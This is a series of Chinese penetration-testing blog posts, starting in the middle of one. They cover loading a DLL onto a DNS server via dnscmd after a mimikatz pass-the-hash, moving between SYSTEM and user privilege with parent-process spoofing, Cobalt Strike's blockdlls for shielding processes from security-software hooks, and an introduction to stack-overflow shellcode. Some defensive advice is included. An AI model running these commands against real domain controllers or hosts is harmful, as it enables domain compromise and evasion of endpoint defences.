<p>也可以实现自动化输入：</p>

<p>命令行下执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:A55E0720F0041193632A58E007624B40 /run:\"cmd.exe /c c:\test\1.bat\""
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">c:\test\1.bat</code>中保存dnscmd的命令</p>

<h3 id="7使用dnscmd命令">7、使用dnscmd命令</h3>

<p>DNS服务器的IP：192.168.10.1</p>

<p>命令行执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnscmd 192.168.10.1 /config /serverlevelplugindll \\test.com\SYSVOL\test.com\scripts\testdns.dll
</code></pre></div></div>

<p>对于DNS服务器来说，此时会新建一个注册表项</p>

<p>位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\</code></p>

<ul>
  <li>ServerLevelPluginDll</li>
  <li>REG_SZ</li>
  <li><code class="language-plaintext highlighter-rouge">\\test.com\SYSVOL\test.com\scripts\testdns.dll</code></li>
</ul>

<h3 id="8重启dns服务后会加载dll">8、重启DNS服务后会加载dll</h3>

<p>等待DNS服务器重启</p>

<p>或者远程重启DNS服务器：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc \\192.168.10.1 stop dns
sc \\192.168.10.1 start dns
</code></pre></div></div>

<p>DNS服务器的后台进程如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-5-22/2-1.png" alt="Alt text"></p>

<p>dns.exe将会多次调用testdns.dll，权限为System</p>

<h3 id="9实际利用">9、实际利用</h3>

<p>实际环境中，通常DNS服务器和域控制器是同一台主机</p>

<h2 id="0x03-防御建议">0x03 防御建议</h2>
<hr>

<h3 id="1控制权限">1、控制权限</h3>

<p>避免关键用户凭据被攻击者获得</p>

<p>这里可以使用<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>查看关键用户登陆过哪些主机</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\PowerView.ps1
Invoke-UserHunter -UserName AdministratorUser
</code></pre></div></div>

<h3 id="2监控和设置注册表">2、监控和设置注册表</h3>

<p>位置：<code class="language-plaintext highlighter-rouge">KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\</code></p>

<p>利用dnscmd在DNS服务器上实现远程加载Dll时，会以System权限修改注册表，如果修改注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\</code>的ACL(Access Control List)，删除System用户的Set Value权限，能够阻止这个方法的利用</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-5-22/2-2.png" alt="Alt text"></p>

<p>但有可能影响其他正常功能，该注册表项下的其他键值信息如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WIN-F08C969D7FM.test.com
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
</code></pre></div></div>

<h3 id="3查看日志">3、查看日志</h3>

<h4 id="1记录dns服务的启动和停止">(1)记录DNS服务的启动和停止</h4>

<p>位置：<code class="language-plaintext highlighter-rouge">Application and Services Logs</code>-&gt;<code class="language-plaintext highlighter-rouge">DNS Server</code></p>

<p>命令行查看：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil qe "dns server" /rd:true /f:text
</code></pre></div></div>

<p>ID为2代表DNS服务启动，ID为4代表DNS服务关闭</p>

<h4 id="2记录添加dll的操作">(2)记录添加Dll的操作</h4>

<p>需要使用增强版的DNS日志记录和诊断功能，Server2016默认支持，Server2012需要安装补丁2956577</p>

<p>参考文档：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800669(v=ws.11)</p>

<p>补丁说明：</p>

<p>https://support.microsoft.com/en-us/help/2956577/update-adds-query-logging-and-change-auditing-to-windows-dns-servers</p>

<p>补丁下载：</p>

<p>https://www.catalog.update.microsoft.com/Search.aspx?q=2956577</p>

<p>添加Dll的操作会产生ID为541的日志</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了利用dnscmd在DNS服务器上实现远程加载Dll的方法，结合利用思路给出防御建议。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May 22, 2019
  </div>

  
</article><article class="post">
  <h1>渗透技巧——程序的降权启动</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，常常会遇到需要改变程序启动权限（分为提权和降权）的情况。</p>

<p>提权包含从普通用户权限到管理员权限和从管理员权限到system权限，而渗透测试中的降权通常是指从system权限降到普通用户权限（从管理员权限降到普通用户权限比较简单，方法很多），往往是为了操作当前用户的文件内容（如捕获桌面、操作注册表等）</p>

<p>本文将会介绍具体的降权方法（从system权限降到普通用户权限），理清其中的重点，并且开源一个小工具，用于判断进程权限</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>为什么要降权</li>
  <li>从管理员权限降到普通用户权限的方法</li>
  <li>从system权限降到普通用户权限的方法</li>
  <li>利用SelectMyParent实现提权和降权</li>
</ul>

<p><strong>注：</strong></p>

<p>测试系统： Win7</p>

<h2 id="0x02-为什么要降权">0x02 为什么要降权</h2>
<hr>

<p>使用sytem权限的进程可能会遇到以下问题:</p>

<p><strong>1、无法获得当前用户的文件内容</strong></p>

<p>例如无法捕获用户的屏幕</p>

<p><strong>2、环境变量有差异</strong></p>

<p>比如以下环境变量：</p>

<ul>
  <li>APPDATA</li>
  <li>Temp</li>
  <li>Tmp</li>
  <li>USERDOMAIN</li>
  <li>USERNAME</li>
  <li>USERPROFILE</li>
</ul>

<p>cmd下可通过echo查看环境变量，例如查看环境变量APPDATA的命令为：</p>

<p><code class="language-plaintext highlighter-rouge">echo %appdata%</code></p>

<p>system权限下，查询到的环境变量APPDATA为<code class="language-plaintext highlighter-rouge">C:\Windows\system32\config\systemprofile\AppData\Roaming</code></p>

<p>管理员权限下，查询到的环境变量APPDATA为<code class="language-plaintext highlighter-rouge">C:\Users\a\AppData\Roaming</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/2-1.png" alt="Alt text"></p>

<p>通过API SHGetSpecialFolderPath 获取指定的系统路径，如APPDATA，也能发现权限不同导致的区别</p>

<p>c++代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
#include &lt;Shlobj.h&gt;

bool IsSystemPrivilegeCmp()
{
    static bool isSystemPrivilege = false;
	char *flag="C:\\Windows";
    if (isSystemPrivilege)
    {
        return isSystemPrivilege;
    }
    char szPath[MAX_PATH] = {0};
    if (SHGetSpecialFolderPathA(NULL, szPath, CSIDL_APPDATA, TRUE))
    {
        printf("APPDATA Path:%s\n",szPath);   
		if(memcmp(szPath,flag,strlen(flag))==0)
			printf("[+]I'm System Privilege\n");
		else
			printf("[-]Not System Privilege\n");
    }
    return isSystemPrivilege;
}

int main(int argc, CHAR* argv[])
{
	IsSystemPrivilegeCmp();	
	return 0;
}
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>SHGetSpecialFolderPath支持查询的系统路径可在Shlobj.h中获取</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/2-3.png" alt="Alt text"></p>

<p><strong>3、注册表有差异</strong></p>

<p>对HKCU的部分注册表操作会被重定向到HKEY_USERS.DEFAULT</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/2-4.png" alt="Alt text"></p>

<h2 id="0x03-从管理员权限降到普通用户权限的方法">0x03 从管理员权限降到普通用户权限的方法</h2>
<hr>

<h3 id="1runas">1、runas</h3>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">runas /user:a calc.exe</code></p>

<p>接着输入密码：123456</p>

<p>calc.exe的权限为用户a的权限</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/3-1.png" alt="Alt text"></p>

<p><strong>缺点：</strong></p>

<p>需要等待用户手动输入密码，不够自动化</p>

<p>但是可以借助管道实现自动输入密码，需要借助第三方工具Sanur，方法不具体介绍</p>

<h3 id="2第三方工具lsrunas">2、第三方工具：lsrunas</h3>

<p>下载地址：</p>

<p>http://www.verydoc.com/exeshell.html</p>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">lsrunas.exe /user:a /password:123456 /domain: /command:"calc.exe" /runpath:c:\</code></p>

<p><strong>注：</strong></p>

<p>/domain:参数为空表示为本机</p>

<p>从管理员权限降权到普通用户权限，成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/4-1.png" alt="Alt text"></p>

<h3 id="3第三方工具cpau">3、第三方工具：CPAU</h3>

<p>下载地址可参考我的github：</p>

<p>https://github.com/3gstudent/From-System-authority-to-Medium-authority</p>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">CPAU.exe  -u a -p 123456 -ex "calc.exe" -cwd c:\windows\system32 -lwp</code></p>

<p><strong>注：</strong></p>

<p>必须添加参数-lwp或-lwop，否则无法实现降权</p>

<p>从管理员权限降权到普通用户权限，成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/4-2.png" alt="Alt text"></p>

<h3 id="4powershell">4、powershell</h3>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$uname="a"                                                      
$pwd=ConvertTo-SecureString  "123456" -AsPlainText –Force                   
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)        
Start-Process -FilePath  "calc.exe" -Credential $cred  
</code></pre></div></div>

<h3 id="5c">5、c++</h3>

<p>使用API：</p>

<ul>
  <li>CreateProcessAsUser</li>
  <li>CreateProcess</li>
</ul>

<h2 id="0x04-从system权限降到普通用户权限的方法">0x04 从system权限降到普通用户权限的方法</h2>
<hr>

<p><strong>注：</strong></p>

<p>本次测试的system权限通过漏洞获取</p>

<h3 id="1runas-1">1、runas</h3>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">runas /user:a calc.exe</code></p>

<p>接着输入密码：123456</p>

<p>成功降权，但启动失败，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/5-1.png" alt="Alt text"></p>

<h3 id="2第三方工具lsrunas-1">2、第三方工具：lsrunas</h3>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">lsrunas.exe /user:a /password:123456 /domain: /command:"calc.exe" /runpath:c:\</code></p>

<p>同上，成功降权，但启动失败</p>

<h3 id="3第三方工具cpau-1">3、第三方工具：CPAU</h3>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">CPAU.exe  -u a -p 123456 -ex "calc.exe" -lwp</code></p>

<p>CPAU不支持system权限启动，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/5-2.png" alt="Alt text"></p>

<h3 id="4powershell-1">4、powershell</h3>

<p>同1，成功降权，但启动失败</p>

<h3 id="5c-1">5、c++</h3>

<p>可以使用Didier Stevens的工具SelectMyParent</p>

<p><strong>注：</strong></p>

<p>该代码尚未在github共享，所以我在我的github上传了该代码，并注明作者为Didier Stevens</p>

<p>代码地址：</p>

<p>https://github.com/3gstudent/From-System-authority-to-Medium-authority/blob/master/SelectMyParent.cpp</p>

<h3 id="selectmyparent">SelectMyParent：</h3>

<p>用来创建具有选定父进程的windows进程</p>

<p>例如：创建新进程calc.exe，使用SelectMyParent可以将新进程calc.exe设置为进程winlogon.exe的子进程</p>

<p>使用步骤：</p>

<p><strong>1、获取进程winlogon.exe的pid</strong></p>

<p>在我的测试系统中，进程winlogon.exe的pid为504</p>

<p><strong>2、启动SelectMyParent</strong></p>

<p>参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">SelectMyParent.exe calc.exe 504</code></p>

<p>显示calc.exe为winlogon.exe的子进程，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/6-1.png" alt="Alt text"></p>

<p>该方法主要可以用来提高进程的隐蔽性，欺骗用户</p>

<p><strong>特别的地方：</strong></p>

<p>由于子进程会继承父进程的权限，并且winlogon.exe的权限为system，那么其子进程calc.exe的权限也将会成为system</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/6-2.png" alt="Alt text"></p>

<p>也就是说，我们可以基于SelectMyParent实现以下提权和降权操作：</p>

<ul>
  <li>提权：从管理员权限到system权限</li>
  <li>降权：从system权限到admin权限</li>
  <li>降权：从system权限到普通用户权限</li>
</ul>

<p><strong>操作步骤：</strong></p>

<p><strong>1、获取进程pid</strong></p>

<p>cmd下获取进程pid的方法：</p>

<p><code class="language-plaintext highlighter-rouge">tasklist /v /fo list</code></p>

<p>可获取每个进程对应的pid及权限(用户名的值表示)，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/6-3.png" alt="Alt text"></p>

<p>为了方便测试，可以使用过滤将特定权限的进程筛选出来，例如筛选NT AUTHORITY\SYSTEM</p>

<p>命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">tasklist /v /fo list /fi "USERNAME eq NT AUTHORITY\SYSTEM"</code></p>

<p>如果是获取普通用户权限的进程，筛选的USERNAME可设置为<code class="language-plaintext highlighter-rouge">whoami</code>的返回结果</p>

<p><strong>2、使用SelectMyParent.exe</strong></p>

<p><strong>从管理员权限到system权限：</strong></p>

<p>上文已经演示，不再重复介绍</p>

<p><strong>从system权限到admin权限：</strong></p>

<p>通过tasklist无法区分进程是否是管理员权限还是普通用户权限</p>

<p>于是我通过c++写了一个小工具，作用如下：</p>

<ul>
  <li>遍历进程</li>
  <li>判断进程权限，如果为管理员权限，进行标记</li>
</ul>

<p>代码下载地址：</p>

<p>https://github.com/3gstudent/From-System-authority-to-Medium-authority/blob/master/Processauthority.cpp</p>

<p>工具使用如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/6-4.png" alt="Alt text"></p>

<p><strong>从system权限到普通用户权限：</strong></p>

<p>选取普通用户权限进程，pid为3864，创建的calc.exe权限也会具有普通用户权限，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-30/6-5.png" alt="Alt text"></p>

<p>成功实现从system权限到普通用户权限的降权</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文对常用降权方法进行测试，结论是有些条件下降权方法会失效，通用的方式是使用SelectMyParent进行降权。</p>

<p>结合实际，开源了遍历判断进程权限的小工具，用于提高效率。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on May 30, 2017
  </div>

  
</article><article class="post">
  <h1>Cobalt Strike的blockdlls利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Cobalt Strike 3.14添加了blockdlls功能，限定子进程只能加载带有Microsoft签名的dll。</p>

<p>这个功能可以阻止第三方安全软件向子进程注入dll，也就无法对子进程进行hook，最终起到保护子进程的效果。</p>

<p>XPN在他的博客中也介绍了相关内容，地址如下：</p>

<p>https://blog.xpnsec.com/protecting-your-malware/</p>

<p>本文将要扩展blockdlls的利用方法，分别介绍查看进程是否开启blockdlls和修改当前进程开启blockdlls的方法，比较Win8和Win10系统在使用上的区别，开源c代码，分享脚本编写的细节。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Cobalt Strike中的blockdlls</li>
  <li>查看进程是否开启blockdlls的方法</li>
  <li>修改当前进程，开启blockdlls的方法</li>
  <li>Win8和Win10系统在使用上的区别</li>
  <li>利用分析</li>
</ul>

<h2 id="0x02-cobalt-strike中的blockdlls">0x02 Cobalt Strike中的blockdlls</h2>
<hr>

<p>Cobalt Strike中的blockdlls将会创建一个子进程并开启blockdlls功能</p>

<p>XPN在博客中分享了实现同样功能的c代码，地址如下：</p>

<p>https://blog.xpnsec.com/protecting-your-malware/</p>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;Windows.h&gt;

int main()
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T size = 0;
    BOOL ret;

    // Required for a STARTUPINFOEXA
    ZeroMemory(&amp;si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    // Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
    InitializeProcThreadAttributeList(NULL, 1, 0, &amp;size);

    // Allocate memory for PROC_THREAD_ATTRIBUTE_LIST
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(),
        0,
        size
    );

    // Initialise our list 
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &amp;size);

    // Enable blocking of non-Microsoft signed DLLs
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

    // Assign our attribute
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &amp;policy, sizeof(policy), NULL, NULL);

    // Finally, create the process
    ret = CreateProcessA(
        NULL,
        (LPSTR)"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        true,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;si),
        &amp;pi
    );
}
</code></pre></div></div>

<p>通过STARTUPINFOEX结构体指定了要创建子进程的安全策略(开启PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)，这个安全策略起到了阻止加载非Microsoft签名dll的作用</p>

<p>生成子进程后，使用ProcessHacker能够看到开启blockdlls功能的提示，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-25/2-1.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-25/2-2.png" alt="Alt text"></p>

<p>开启blockdlls功能后，尝试对这个进程进行dll注入，注入的代码可参考：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/NtCreateThreadEx%20%2B%20LdrLoadDll.cpp</p>

<p>注入时报错，提示如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-25/3-1.png" alt="Alt text"></p>

<p>成功复现Cobalt Strike中blockdlls的功能</p>

<p>接来下，需要找到这个功能相关的细节</p>

<p>经过一些搜索，找到了相关API <code class="language-plaintext highlighter-rouge">GetProcessMitigationPolicy()</code>，能够用来读取进程的安全策略</p>

<p>资料如下：</p>

<p>https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getprocessmitigationpolicy</p>

<p>签名策略对应的结构体为<code class="language-plaintext highlighter-rouge">PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY</code>，资料如下</p>

<p>https://docs.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-process_mitigation_binary_signature_policy</p>

<p>资料显示该API支持的最低系统为Win8，这里猜测API <code class="language-plaintext highlighter-rouge">GetProcessMitigationPolicy()</code>同blockdlls支持的操作系统版本应该相同</p>

<p>经过测试，发现Cobalt Strike中blockdlls支持的系统最低为Win8</p>

<h2 id="0x03-查看进程是否开启blockdlls的方法">0x03 查看进程是否开启blockdlls的方法</h2>
<hr>

<p>开启blockdlls等同于进程开启了安全策略ProcessSignaturePolicy(启用MicrosoftSignedOnly功能)</p>

<p>可以使用API <code class="language-plaintext highlighter-rouge">GetProcessMitigationPolicy()</code>获取进程的安全策略，判断是否开启blockdlls功能</p>

<p>使用API <code class="language-plaintext highlighter-rouge">GetProcessMitigationPolicy()</code>能够查询进程的多个安全策略，参考资料：</p>

<p>https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getprocessmitigationpolicy</p>

<p>按照API的调用格式尝试编写代码，代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/GetProcessMitigationPolicyForWin10.cpp</p>

<p>代码能够查询指定进程的所有安全策略</p>

<p>在Win10系统测试没有问题，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-25/2-3.png" alt="Alt text"></p>

<p>在Win8系统(Server2012也一样)测试，无法获得安全策略ProcessSignaturePolicy的信息，而ProcessHacker在Win8系统不存在这个问题</p>

<p>通过查看ProcessHacker的源码，找到解决方法：</p>

<p>这里需要通过<code class="language-plaintext highlighter-rouge">NtQueryInformationProcess()</code>实现</p>

<p>Win8系统下可用的完整代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/GetProcessMitigationPolicyForWin8.cpp</p>

<p>代码能够查询Win8系统下指定进程的所有安全策略，需要注意的是Win8系统不支持以下安全策略：</p>

<ul>
  <li>ControlFlowGuardPolicy</li>
  <li>FontDisablePolicy</li>
  <li>ImageLoadPolicy</li>
  <li>SystemCallFilterPolicy</li>
  <li>PayloadRestrictionPolicy</li>
  <li>ChildProcessPolicy</li>
  <li>SideChannelIsolationPolicy</li>
</ul>

<p>在Win8系统测试没有问题，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-25/2-4.png" alt="Alt text"></p>

<h2 id="0x04-修改当前进程开启blockdlls的方法">0x04 修改当前进程，开启blockdlls的方法</h2>
<hr>

<p>修改当前进程开启blockdlls等同于修改当前进程的安全策略ProcessSignaturePolicy(启用MicrosoftSignedOnly功能)</p>

<p>可以先使用API <code class="language-plaintext highlighter-rouge">GetProcessMitigationPolicy()</code>获取进程的安全策略，再通过API <code class="language-plaintext highlighter-rouge">SetProcessMitigationPolicy()</code>修改安全策略ProcessSignaturePolicy(启用MicrosoftSignedOnly功能)</p>

<p>按照API的调用格式尝试编写代码，代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/SetProcessMitigationPolicy(Signature)ForWin10_CurrentProcess.cpp</p>

<p>代码能够修改当前进程的安全策略，启用MicrosoftSignedOnly功能</p>

<p>在Win10系统测试没有问题</p>

<p>在Win8系统(Server2012也一样)测试，出现问题，无法修改</p>

<p>解决方法同上：</p>

<p>通过<code class="language-plaintext highlighter-rouge">NtSetInformationProcess()</code>实现</p>

<p>Win8系统下可用的完整代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/SetProcessMitigationPolicy(Signature)ForWin8_CurrentProcess.cpp</p>

<p>代码能够修改Win8系统下当前进程的安全策略，开启blockdlls</p>

<h2 id="0x05-利用分析">0x05 利用分析</h2>
<hr>

<p>开启blockdlls等同于进程开启安全策略ProcessSignaturePolicy(启用MicrosoftSignedOnly功能)，不仅可以应用到子进程，还可以应用到当前进程</p>

<p>支持系统：Win8-Win10</p>

<p>开启blockdlls后，可以阻止第三方安全软件向此进程注入dll，也就无法对进程进行hook，最终起到保护进程的效果</p>

<p>在Win8系统，需要使用<code class="language-plaintext highlighter-rouge">NtQueryInformationProcess()</code>和<code class="language-plaintext highlighter-rouge">NtSetInformationProcess()</code>进行查看和修改安全策略</p>

<p>无法使用<code class="language-plaintext highlighter-rouge">NtSetInformationProcess()</code>修改远程进程的安全策略，报错提示<code class="language-plaintext highlighter-rouge">c000000d(STATUS_ILLEGAL_INSTRUCTION)</code></p>

<p>无法通过<a href="https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81/">《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》</a>
和<a href="https://3gstudent.github.io/3gstudent.github.io/Catalog%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-Long-UNC%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97/">《Catalog签名伪造——Long UNC文件名欺骗》</a>绕过blockdlls的保护</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文扩展了blockdlls的利用方法，分别介绍查看进程是否开启blockdlls和修改当前进程开启blockdlls的方法，比较Win8和Win10系统在使用上的区别，开源c代码，分享脚本编写的细节，总结利用思路。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November 25, 2019
  </div>

  
</article><article class="post">
  <h1>Windows Shellcode学习笔记——shellcode在栈溢出中的利用与优化</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E7%9A%84%E6%8F%90%E5%8F%96%E4%B8%8E%E6%B5%8B%E8%AF%95/">《Windows Shellcode学习笔记——shellcode的提取与测试》</a>中介绍了如何对shellcode作初步优化，动态获取Windows API地址并调用，并通过程序实现自动提取机器码作为shellcode并保存到文件中。</p>

<p>弹框实例shellcode的bin文件已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Shellcode-Generater/blob/master/shellcode.bin</p>

<p><strong>注：</strong></p>

<p>shellcode.bin由getshellcode.cpp生成</p>

<p>getshellcode.cpp地址如下：</p>

<p>https://github.com/3gstudent/Shellcode-Generater/blob/master/getshellcode.cpp</p>

<p>接下来，要研究shellcode在具体环境中的使用和优化技巧</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>先从最入门的缓冲区溢出开始</p>

<p>本文将要结合《0day安全：软件漏洞分析技术》中的“栈溢出原理与实践”章节，以其中的栈溢出代码作样本，优化我们自己生成的弹框实例shellcode，实现在栈溢出中的初步利用。</p>

<h2 id="0x02-相关概念">0x02 相关概念</h2>
<hr>

<h3 id="栈区">栈区：</h3>

<p>用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行</p>

<h3 id="特殊寄存器">特殊寄存器：</h3>

<p>ESP:栈指针寄存器(extended stack pointer)，指向栈顶</p>

<p>EBP:基址指针寄存器(extended base pointer)，指向栈底</p>

<p>EIP:指令寄存器(extended instruction pointer)，指向下一条等待执行的指令地址</p>

<p><strong>函数代码在栈中保存顺序(直观理解，已省略其他细节)：</strong></p>

<ul>
  <li>buffer</li>
  <li>前栈帧EBP</li>
  <li>返回地址</li>
  <li>ESP</li>
</ul>

<p><strong>函数栈溢出原理(直观理解，已省略其他细节)：</strong></p>

<p>正常情况下函数在返回过程中，最后会执行返回地址中保存的内容，通常是跳到下一条指令的地址</p>

<p>如果buffer长度过长，长到覆盖了返回地址的值，那么函数在返回时，就会执行被覆盖的内容</p>

<p>如果将shellcode保存到buffer中，覆盖的返回地址为shellcode的起始地址，那么，shellcode将得到执行，完成栈溢出的利用</p>

<h2 id="0x03-栈溢出实例测试">0x03 栈溢出实例测试</h2>
<hr>

<p>样本代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#define PASSWORD "1234567"

int verify_password (char *password)
{
	int authenticated;
	char buffer[44];
	authenticated=strcmp(password,PASSWORD);
	strcpy(buffer,password);
	return authenticated;
}

int main()
{
	int valid_flag=0;
	char password[1024];
	FILE *fp;
	LoadLibrary("user32.dll");
	if(!(fp=fopen("password.txt","rw+")))
		return 0;
	fread(password,56,1,fp);
	valid_flag=verify_password(password);
	if(valid_flag)
	{
		printf("wrong\n");
	}
	else
	{
		printf("right\n");	
	}
	fclose(fp);
	return 0;
}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>代码选自章节2.4.2中的实验代码，作细微调整
其中
fscanf(fp,”%s”,password)在遇到空格和换行符时结束，如果shellcode中包含空格(0x20)，会被截断，导致读取文件不完整</p>

<p>因此，将其替换为fread(password,56,1,fp);</p>

<p>数组password长度为56，数组buffer长度为44，在执行strcpy(buffer,password);时存在栈溢出</p>

<p>根据函数栈溢出原理，实现栈溢出需要以下过程：</p>

<p>(1) 分析并调试程序，获得淹没返回地址的偏移</p>

<p>(2) 获得buffer的起始地址，根据获得的偏移将其覆盖返回地址，使得函数返回时执行buffer起始地址保存的代码</p>

<p>(3) 提取弹框操作的机器码并保存于buffer的起始地址处，在函数返回时得到执行</p>

